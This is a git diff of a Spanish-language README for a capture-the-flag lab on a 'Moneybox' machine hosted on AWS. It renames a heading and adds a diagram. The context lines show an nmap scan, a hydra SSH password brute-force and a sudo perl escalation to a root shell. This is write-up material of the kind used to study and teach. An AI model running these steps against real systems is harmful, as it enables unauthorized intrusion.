@@ -10,8 +10,7 @@ Tanto Moneybox como Chronos se montaron en diferentes instancias EC2, adicionalm
 **`Infraestructura securizada con herramientas nativas AWS`**
 <p align="center"><img src="https://drive.google.com/uc?export=view&id=1pADHae9b56royVwhx0JmwbbxH67-VIH5"></img></a>
 
-# CTF-Moneybox
-+ Herramientas
+# Moneybox (Técnicas aplicadas)
 **`Scanning`**
 ```bash
 $ nmap -sV <ip-target>
@@ -36,3 +35,5 @@ $ hydra -l <any-user> -P <dictionary.txt> -f <ip-target> ssh
 ```bash
 $ sudo perl -e 'exec "/bin/sh";'
 ```
+**`Execution Diagram`**
+<p align="center"><img src="https://drive.google.com/uc?export=view&id=1KeScz_V1E5-qjqXH3OwnRvCzOa4t1ueu"></img></p>
